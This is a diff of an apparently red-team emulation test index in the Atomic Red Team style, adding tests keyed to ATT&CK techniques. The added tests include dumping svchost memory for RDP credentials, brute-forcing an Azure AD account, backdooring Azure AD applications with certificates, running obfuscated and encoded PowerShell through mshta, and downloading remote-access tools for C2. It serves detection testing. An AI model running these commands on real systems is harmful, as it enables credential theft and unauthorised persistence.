@@ -2522,11 +2522,15 @@ credential-access:
         'aureport --tty' or other audit.d reading tools to read the log output, which
         is binary.  Mac OS does not currently contain the pam_tty_audit.so library.
         \n"
-      prereq_command: 'test -f ''/usr/lib/pam/pam_tty_audit.so -o  /usr/lib64/security/pam_tty_audit.so''
+      dependencies:
+      - description: 'Checking if pam_tty_audit.so is installed
 
 '
-      get_prereq_command: 'echo "Sorry, you must install module pam_tty_audit.so and
-        recompile, for this test to work"
+        prereq_command: 'test -f ''/usr/lib/pam/pam_tty_audit.so -o  /usr/lib64/security/pam_tty_audit.so''
+
+'
+        get_prereq_command: 'echo "Sorry, you must install module pam_tty_audit.so
+          and recompile, for this test to work"
 
 '
       supported_platforms:
@@ -4062,6 +4066,25 @@ credential-access:
           C:\\Windows\\System32\\NPPSpy.dll -ErrorAction Ignore"
         name: powershell
         elevation_required: true
+    - name: Dump svchost.exe to gather RDP credentials
+      auto_generated_guid: d400090a-d8ca-4be0-982e-c70598a23de9
+      description: |
+        The svchost.exe contains the RDP plain-text credentials.
+        Source: https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/
+
+        Upon successful execution, you should see the following file created $env:TEMP\svchost-exe.dmp.
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          $ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
+          if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
+          C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full
+        cleanup_command: 'Remove-Item $env:TEMP\svchost-exe.dmp -ErrorAction Ignore
+
+'
+        name: powershell
+        elevation_required: true
   T1110.002:
     technique:
       external_references:
@@ -4422,6 +4445,55 @@ credential-access:
               Write-Host " [!] #{user}:${password} are valid credentials!"
             } catch {
               Write-Host $_.Exception.Message
+            }
+          }
+          Write-Host "End of bruteforce"
+    - name: Brute Force Credentials of single Azure AD user
+      auto_generated_guid: 5a51ef57-299e-4d62-8e11-2d440df55e69
+      description: 'Attempt to brute force Azure AD user via AzureAD powershell module.
+
+'
+      supported_platforms:
+      - azure-ad
+      input_arguments:
+        username:
+          description: Account to bruteforce. We encourage users running this atomic
+            to add a valid microsoft account domain; for eg "bruce.wayne@<valid_ms_account.com>"
+          type: String
+          default: bruce.wayne@contoso.com
+        passwords:
+          description: List of passwords we will attempt to brute force with
+          type: String
+          default: Password1`n1q2w3e4r`nPassword!
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'AzureAD module must be installed.
+
+'
+        prereq_command: 'if (Get-Module AzureAD) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Install-Module -Name AzureAD -Force
+
+'
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          Import-Module -Name AzureAD
+
+          $passwords = "#{passwords}".split("{`n}")
+          foreach($password in $passwords) {
+            $PWord = ConvertTo-SecureString -String "$password" -AsPlainText -Force
+            $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
+            try {
+              Write-Host " [-] Attempting ${password} on account #{username}."
+              Connect-AzureAD -Credential $Credential 2>&1> $null
+              # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
+              Write-Host " [!] #{username}:${password} are valid credentials!`r`n"
+              break
+            } catch {
+              Write-Host " [-] #{username}:${password} invalid credentials.`r`n"
             }
           }
           Write-Host "End of bruteforce"
@@ -7908,11 +7980,15 @@ collection:
         'aureport --tty' or other audit.d reading tools to read the log output, which
         is binary.  Mac OS does not currently contain the pam_tty_audit.so library.
         \n"
-      prereq_command: 'test -f ''/usr/lib/pam/pam_tty_audit.so -o  /usr/lib64/security/pam_tty_audit.so''
+      dependencies:
+      - description: 'Checking if pam_tty_audit.so is installed
 
 '
-      get_prereq_command: 'echo "Sorry, you must install module pam_tty_audit.so and
-        recompile, for this test to work"
+        prereq_command: 'test -f ''/usr/lib/pam/pam_tty_audit.so -o  /usr/lib64/security/pam_tty_audit.so''
+
+'
+        get_prereq_command: 'echo "Sorry, you must install module pam_tty_audit.so
+          and recompile, for this test to work"
 
 '
       supported_platforms:
@@ -13512,7 +13588,7 @@ privilege-escalation:
         command: |
           sudo cp #{path_malicious_plist} /Library/LaunchDaemons/#{plist_filename}
           sudo launchctl load -w /Library/LaunchDaemons/#{plist_filename}
-        cleanup: |
+        cleanup_command: |
           sudo launchctl unload /Library/LaunchDaemons/#{plist_filename}
           sudo rm /Library/LaunchDaemons/#{plist_filename}
   T1053.004:
@@ -28579,6 +28655,28 @@ defense-evasion:
         command: 'Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath
           #{mshta_file_path}'
         name: powershell
+    - name: Mshta used to Execute PowerShell
+      auto_generated_guid: 8707a805-2b76-4f32-b1c0-14e558205772
+      description: 'Use Mshta to execute arbitrary PowerShell. Example is from the
+        2021 Threat Detection Report by Red Canary.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        message:
+          description: Encoded message to include
+          type: string
+          default: Hello,%20MSHTA!
+        seconds_to_sleep:
+          description: How many seconds to sleep/wait
+          type: string
+          default: 5
+      executor:
+        command: 'mshta.exe "about:<hta:application><script language="VBScript">Close(Execute("CreateObject(""Wscript.Shell"").Run%20""powershell.exe%20-nop%20-Command%20Write-Host%20#{message};Start-Sleep%20-Seconds%20#{seconds_to_sleep}"""))</script>''"
+
+'
+        name: command_prompt
   T1218.007:
     technique:
       id: attack-pattern--365be77f-fc0e-42ee-bac8-4faf806d9336
@@ -29452,6 +29550,25 @@ defense-evasion:
           default: 127.0.0.1
       executor:
         command: 'Invoke-WebRequest -Uri #{ip_address} -Method POST -Body #{input_file}
+
+'
+        name: powershell
+    - name: Obfuscated Command in PowerShell
+      auto_generated_guid: 8b3f4ed6-077b-4bdd-891c-2d237f19410f
+      description: 'This is an obfuscated PowerShell command which when executed prints
+        "Hello, from PowerShell!". Example is from the 2021 Threat Detection Report
+        by Red Canary.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: '$cmDwhy =[TyPe]("{0}{1}" -f ''S'',''TrING'')  ;   $pz2Sb0  =[TYpE]("{1}{0}{2}"-f''nv'',''cO'',''ert'')  ;  &("{0}{2}{3}{1}{4}"
+          -f''In'',''SiO'',''vOKe-EXp'',''ReS'',''n'') (  (&("{1}{2}{0}"-f''blE'',''gET-'',''vaRIA'')  (''CMdw''+''h''+''y''))."v`ALUe"::("{1}{0}"
+          -f''iN'',''jO'').Invoke('''',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163
+          , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40,
+          120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .(''%'') { (
+          [CHAR] (  $Pz2sB0::"t`OinT`16"(( [sTring]${_}) ,8)))})) )
 
 '
         name: powershell
@@ -37108,6 +37225,159 @@ persistence:
       - Azure AD
       identifier: T1098.001
     atomic_tests:
+    - name: Azure AD Application Hijacking - Service Principal
+      auto_generated_guid: b8e747c3-bdf7-4d71-bce2-f1df2a057406
+      description: |
+        Add a certificate to an Application through its Service Principal.
+        The certificate can then be used to authenticate as the application and benefit from its rights.
+        An account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.
+      supported_platforms:
+      - azure-ad
+      input_arguments:
+        username:
+          description: Azure AD username
+          type: String
+          default: jonh@contoso.com
+        password:
+          description: Azure AD password
+          type: String
+          default: p4sswd
+        service_principal_name:
+          description: Name of the targeted service principal
+          type: String
+          default: SuperSP
+        certificate_password:
+          description: Password of the new certificate
+          type: string
+          default: Passw0rd
+        path_to_cert:
+          description: Path of the new certificate, locally stored
+          type: string
+          default: "$env:TEMP"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'AzureAD module must be installed.
+
+'
+        prereq_command: 'if (Get-Module AzureAD) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Install-Module -Name AzureAD -Force
+
+'
+      executor:
+        command: |
+          Import-Module -Name AzureAD
+          $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+          $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
+          Connect-AzureAD -Credential $Credential
+
+          $sp = Get-AzureADServicePrincipal -Searchstring "#{service_principal_name}"
+          if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit }
+          # in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
+          $certNotAfter = (Get-Date).AddDays(2)
+          $credNotAfter = (Get-Date).AddDays(1)
+          $thumb = (New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -FriendlyName "AtomicCert" -CertStoreLocation "cert:\CurrentUser\My" -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $certNotAfter).Thumbprint
+          $pwd = ConvertTo-SecureString -String "#{certificate_password}" -Force -AsPlainText
+          Export-PfxCertificate -cert "cert:\CurrentUser\my\$thumb" -FilePath "#{path_to_cert}\#{service_principal_name}.pfx" -Password $pwd
+
+          $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate("#{path_to_cert}\#{service_principal_name}.pfx", $pwd)
+          $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
+
+          New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier "AtomicTest" -Usage Verify -Value $keyValue -EndDate $credNotAfter
+
+          Start-Sleep -s 30
+          $tenant=Get-AzureADTenantDetail
+          $auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $thumb
+          Write-Host "Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)"
+          Write-Host "End of Hijacking"
+        cleanup_command: "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString
+          -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName
+          System.Management.Automation.PSCredential -ArgumentList \"#{username}\",
+          $Pword\nConnect-AzureAD -Credential $Credential\n\n$sp = Get-AzureADServicePrincipal
+          -Searchstring \"#{service_principal_name}\"\n$credz = Get-AzureADServicePrincipalKeyCredential
+          -ObjectId $sp.ObjectId\nforeach ($cred in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier)
+          -eq \"AtomicTest\") {\n    Remove-AzureADServicePrincipalKeyCredential -ObjectId
+          $sp.ObjectId -KeyId $cred.KeyId\n  }  \n}\nGet-ChildItem -Path Cert:\\CurrentUser\\My
+          | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item\nrm \"#{path_to_cert}\\#{service_principal_name}.pfx\"\n"
+        name: powershell
+        elevation_required: false
+    - name: Azure AD Application Hijacking - App Registration
+      auto_generated_guid: a12b5531-acab-4618-a470-0dafb294a87a
+      description: |
+        Add a certificate to an Application through its App Registration.
+        The certificate can then be used to authenticate as the application and benefit from its rights.
+        An account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.
+      supported_platforms:
+      - azure-ad
+      input_arguments:
+        username:
+          description: Azure AD username
+          type: String
+          default: jonh@contoso.com
+        password:
+          description: Azure AD password
+          type: String
+          default: p4sswd
+        application_name:
+          description: Name of the targeted application
+          type: String
+          default: SuperApp
+        certificate_password:
+          description: Password of the new certificate
+          type: string
+          default: Passw0rd
+        path_to_cert:
+          description: Path of the new certificate, locally stored
+          type: string
+          default: "$env:TEMP"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'AzureAD module must be installed.
+
+'
+        prereq_command: 'if (Get-Module AzureAD) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Install-Module -Name AzureAD -Force
+
+'
+      executor:
+        command: |
+          Import-Module -Name AzureAD
+          $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+          $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
+          Connect-AzureAD -Credential $Credential
+
+          $app = Get-AzureADApplication -Searchstring "#{application_name}"
+          if ($app -eq $null) { Write-Warning "Application not found"; exit }
+          $certNotAfter = (Get-Date).AddDays(2)
+          $credNotAfter = (Get-Date).AddDays(1)
+          $thumb = (New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -FriendlyName "AtomicCert" -CertStoreLocation "cert:\CurrentUser\My" -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $certNotAfter).Thumbprint
+          $pwd = ConvertTo-SecureString -String "#{certificate_password}" -Force -AsPlainText
+          Export-PfxCertificate -cert "cert:\CurrentUser\my\$thumb" -FilePath "#{path_to_cert}\#{application_name}.pfx" -Password $pwd
+
+          $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate("#{path_to_cert}\#{application_name}.pfx", $pwd)
+          $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
+
+          New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier "AtomicTest" -Usage Verify -Value $keyValue -EndDate $credNotAfter
+
+          Start-Sleep -s 30
+          $tenant=Get-AzureADTenantDetail
+          $auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $thumb
+          Write-Host "Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)"
+          Write-Host "End of Hijacking"
+        cleanup_command: "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString
+          -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName
+          System.Management.Automation.PSCredential -ArgumentList \"#{username}\",
+          $Pword\nConnect-AzureAD -Credential $Credential\n\n$app = Get-AzureADApplication
+          -Searchstring \"#{application_name}\"\n$credz = Get-AzureADApplicationKeyCredential
+          -ObjectId $app.ObjectId\nforeach ($cred in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier)
+          -eq \"AtomicTest\") {\n    Remove-AzureADApplicationKeyCredential -ObjectId
+          $app.ObjectId -KeyId $cred.KeyId\n  }  \n}\nGet-ChildItem -Path Cert:\\CurrentUser\\My
+          | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item\nrm \"#{path_to_cert}\\#{application_name}.pfx\"\n"
+        name: powershell
+        elevation_required: false
     - name: AWS - Create Access Key and Secret Key
       auto_generated_guid: 8822c3b0-d9f9-4daf-a043-491160a31122
       description: 'Adversaries create their own new access and secret keys to programatically
@@ -39773,7 +40043,7 @@ persistence:
           $User.DisplayName = $SamAccountName
           $User.Save()
           $User
-        cleanup_command: 'net user "#{username}" >nul 2>&1 /del /domain
+        cleanup_command: 'cmd /c "net user #{username} /del >nul 2>&1"
 
 '
         name: powershell
@@ -41381,7 +41651,7 @@ persistence:
         command: |
           sudo cp #{path_malicious_plist} /Library/LaunchDaemons/#{plist_filename}
           sudo launchctl load -w /Library/LaunchDaemons/#{plist_filename}
-        cleanup: |
+        cleanup_command: |
           sudo launchctl unload /Library/LaunchDaemons/#{plist_filename}
           sudo rm /Library/LaunchDaemons/#{plist_filename}
   T1053.004:
@@ -51395,7 +51665,7 @@ discovery:
 
 '
         name: bash
-        elevation_require: true
+        elevation_required: true
     - name: Network Share Discovery command prompt
       auto_generated_guid: 20f1097d-81c1-405c-8380-32174d493bbb
       description: |
@@ -59876,6 +60146,55 @@ execution:
           -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute
           -ErrorAction Stop'
         name: powershell
+    - name: PowerShell Command Execution
+      auto_generated_guid: a538de64-1c74-46ed-aa60-b995ed302598
+      description: 'Use of obfuscated PowerShell to execute an arbitrary command;
+        outputs "Hello, from PowerShell!". Example is from the 2021 Threat Detection
+        Report by Red Canary.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        obfuscated_code:
+          description: 'Defaults to: Invoke-Expression with a "Write-Host" line.'
+          type: string
+          default: JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
+      executor:
+        command: 'powershell.exe -e  #{obfuscated_code}
+
+'
+        name: command_prompt
+    - name: PowerShell Invoke Known Malicious Cmdlets
+      auto_generated_guid: 49eb9404-5e0f-4031-a179-b40f7be385e3
+      description: Powershell execution of known Malicious PowerShell Cmdlets
+      supported_platforms:
+      - windows
+      input_arguments:
+        Malicious_cmdlets:
+          description: Known Malicious Cmdlets
+          type: String
+          default: '"Add-Persistence", "Find-AVSignature", "Get-GPPAutologon", "Get-GPPPassword",
+            "Get-HttpStatus", "Get-Keystrokes", "Get-SecurityPackages", "Get-TimedScreenshot",
+            "Get-VaultCredential", "Get-VolumeShadowCopy", "Install-SSP", "Invoke-CredentialInjection",
+            "Invoke-DllInjection", "Invoke-Mimikatz", "Invoke-NinjaCopy", "Invoke-Portscan",
+            "Invoke-ReflectivePEInjection", "Invoke-ReverseDnsLookup", "Invoke-Shellcode",
+            "Invoke-TokenManipulation", "Invoke-WmiCommand", "Mount-VolumeShadowCopy",
+            "New-ElevatedPersistenceOption", "New-UserPersistenceOption", "New-VolumeShadowCopy",
+            "Out-CompressedDll", "Out-EncodedCommand", "Out-EncryptedScript", "Out-Minidump",
+            "PowerUp", "PowerView", "Remove-Comments", "Remove-VolumeShadowCopy",
+            "Set-CriticalProcess", "Set-MasterBootRecord"
+
+'
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |-
+          $malcmdlets = #{Malicious_cmdlets}
+          foreach ($cmdlets in $malcmdlets) {
+              "function $cmdlets { Write-Host Pretending to invoke $cmdlets }"}
+          foreach ($cmdlets in $malcmdlets) {
+              $cmdlets}
   T1059.006:
     technique:
       external_references:
@@ -61351,6 +61670,27 @@ execution:
         cleanup_command: 'del "#{file_contents_path}"
 
 '
+        name: command_prompt
+    - name: Suspicious Execution via Windows Command Shell
+      auto_generated_guid: d0eb3597-a1b3-4d65-b33b-2cda8d397f20
+      description: 'Command line executed via suspicious invocation. Example is from
+        the 2021 Threat Detection Report by Red Canary.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        output_file:
+          description: File to output to
+          type: string
+          default: hello.txt
+        input_message:
+          description: Message to write to file
+          type: string
+          default: Hello, from CMD!
+      executor:
+        command: "%LOCALAPPDATA:~-3,1%md /c echo #{input_message} > #{output_file}
+          & type #{output_file}\n"
         name: command_prompt
   T1047:
     technique:
@@ -64992,6 +65332,27 @@ command-and-control:
         cleanup_command: 'rm -f #{output_file}
 
 '
+    - name: File Download via PowerShell
+      auto_generated_guid: 54a4daf1-71df-4383-9ba7-f1a295d8b6d2
+      description: 'Use PowerShell to download and write an arbitrary file from the
+        internet. Example is from the 2021 Threat Detection Report by Red Canary.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        target_remote_file:
+          description: File to download
+          type: string
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt
+        output_file:
+          description: File to write to
+          type: string
+          default: LICENSE.txt
+      executor:
+        command: "(New-Object Net.WebClient).DownloadString('#{target_remote_file}')
+          | Out-File #{output_file}; Invoke-Item #{output_file}\n"
+        name: powershell
   T1090.001:
     technique:
       external_references:
@@ -66011,6 +66372,23 @@ command-and-control:
         cleanup_command: "get-package *'LogMeIn Client'* -ErrorAction Ignore | uninstall-package
           \n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"\nRemove-Item
           $file1 -ErrorAction Ignore"
+        name: powershell
+        elevation_required: true
+    - name: GoToAssist Files Detected Test on Windows
+      auto_generated_guid: 1b72b3bd-72f8-4b63-a30b-84e91b9c3578
+      description: 'An adversary may attempt to trick the user into downloading GoToAssist
+        and use to establish C2. Download of GoToAssist installer will be at the destination
+        location and ran when sucessfully executed.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          Invoke-WebRequest -OutFile C:\Users\$env:username\Downloads\GoToAssist.exe "https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1"
+          $file1 = "C:\Users\" + $env:username + "\Downloads\GoToAssist.exe"
+          Start-Process $file1 /S;
+        cleanup_command: try{$PathToAtomicsFolder/T1219/Bin/GoToCleanup.ps1} catch{}
         name: powershell
         elevation_required: true
   T1132.001:
